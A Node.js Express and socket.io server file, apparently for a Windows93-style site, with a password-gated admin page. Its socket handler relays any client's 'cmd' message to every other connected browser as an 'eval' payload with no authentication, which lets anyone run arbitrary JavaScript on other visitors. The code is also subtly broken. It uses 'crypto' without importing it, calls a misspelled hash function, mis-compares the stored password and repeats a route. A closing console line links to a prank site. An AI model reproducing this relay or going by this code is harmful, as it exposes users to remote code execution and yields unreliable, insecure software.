var app = require('express')();
var express = require('express');
var http = require('http').Server(app);
const bodyParser = require('body-parser');
var fs = require('fs');
var path = require('path');
var io = require('socket.io')(http);
var corspolicy = require('cors');
fs.exists("./password.sha256", function(is){
  if (!is) throw new Error("Create password.sha256 with your hashed password.\nTip: mkpasswd.js can help you.")
})
var pass = fs.readFileSync("./password.sha256")
app.use(corspolicy()); //interesting, its for enabling FETCH function on the site.


//sha256 functions
				function b16_sha256(data) {
    return crypto.createHash('sha256')
        .update(data)
        .digest('hex');
}

function mul_b16_sha256(data) {
    for (var i = 0; i < 16; i++) {
        data = b16_sha256(data);
    }

    return data;
}

app.use(bodyParser.urlencoded({ extended: true })); //uncomment for POST requests

app.use(express.static(path.join(__dirname, 'public'))); //uncomment to make everything go through the file system like /system/ will request (current path)/public/system/index.html

/*app.get("/",function(req, res){ //comment this out if you uncommented the file system tunnel.
res.sendFile(__dirname+"/index.html") //put your file. also use res.send(<some html>) to send html without a file.
})*/
app.get('/socket.io/socket.io.js', function(req, res) {
	res.sendFile(__dirname + '/node_modules/socket.io/lib/client.js');
});
app.get('/socket.io/socket.io.js', function(req, res) {
	res.sendFile(__dirname + '/node_modules/socket.io/lib/client.js');
});
app.get('/admin', function(req, res){
res.status(400).send("use bruh, the post request...")
})
app.post("/admin", function(req, res){
if (mul_bl_sha256(req.body.pass) != pass ) return res.status(403).send("Access is denied.")
res.sendFile(__dirname + "/admin.html");
})
app.get('*', function(req, res) {
	res.status(404).sendFile(__dirname + '/404.html'); //handle 404, works better with fs tunnel.
});
io.on('connection', function(client) {
	console.log('New connection (someone opened Windows)! ID:' + client.id);
	client.on('cmd', function(nope) {
		client.broadcast.emit('eval', { js: nope, pc: client.id });
	});
});

http.listen(3000, function() {
	console.log('listening on port www.windows93.net');
});

console.log(
	'If you checking console in Google Developer console then u are noob if u wanna be pro Visit this website http://youareanidiot.cc'
);
